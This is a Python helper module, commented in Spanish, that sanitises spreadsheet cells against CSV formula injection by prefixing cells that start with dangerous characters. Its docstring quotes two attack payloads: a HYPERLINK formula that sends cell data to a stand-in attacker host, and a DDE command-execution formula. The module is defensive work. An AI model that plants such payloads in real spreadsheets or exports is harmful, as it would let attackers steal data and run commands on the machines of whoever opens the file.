"""
Excel/CSV safety helpers.

CVE-2014-3524 (CSV injection / "formula injection"): si una celda string
empieza con `=`, `+`, `-`, `@`, tab o carriage-return, Excel/Google Sheets
la interpretan como FÓRMULA al abrir el archivo. Esto es un vector de
exfiltración de datos:
    Nombre de producto: =HYPERLINK("http://attacker/?d="&A1,"click")
    Cuando el dueño abre el reporte → Excel renderiza un link que filtra
    datos del reporte al servidor del atacante.

Vector clásico también ejecuta comandos:
    =cmd|'/c calc'!A1   → abre la calculadora (POC; en la práctica se
                          puede ejecutar binarios via DDE).

Mitigación recomendada por OWASP: prefijar la celda con apóstrofo `'`
si empieza con un carácter peligroso. Excel mantiene el valor literal
visible pero NO lo interpreta como fórmula.

USO:
    from core.excel_safety import sanitize_cell
    cell.value = sanitize_cell(user_supplied_string)

Aplicar en TODOS los exports XLSX/CSV donde el contenido proviene de
inputs del usuario (nombres de producto, descripciones, notas, etc.).
"""

# Caracteres que disparan interpretación como fórmula en Excel/Sheets.
# Orden importa: \t y \r vienen ANTES porque pueden quedar pegados a un
# leading whitespace que después contiene =/+/-/@.
_DANGEROUS_PREFIXES = ("=", "+", "-", "@", "\t", "\r")


def sanitize_cell(value):
    """
    Devuelve `value` tal cual si es seguro; si es un string que empieza con
    un carácter peligroso, lo prefija con apóstrofo `'` para neutralizar
    la interpretación como fórmula.

    No-op para None, números, booleans, fechas, decimales — solo afecta
    strings. Eso significa que se puede usar en cualquier celda sin
    pensar; no rompe celdas legítimamente numéricas.

    Idempotente: aplicar dos veces no agrega un segundo apóstrofo
    (porque el primer prefix `'` ya hace que no empiece con `=`).
    """
    if not isinstance(value, str):
        return value
    if not value:
        return value
    if value[0] in _DANGEROUS_PREFIXES:
        # Excel renderiza `'=foo` como `=foo` (visualmente correcto) sin
        # ejecutar la fórmula. Misma técnica que recomienda OWASP.
        return "'" + value
    return value


def sanitize_row(row):
    """Aplica sanitize_cell a cada elemento de una fila (lista/tupla)."""
    return [sanitize_cell(v) for v in row]
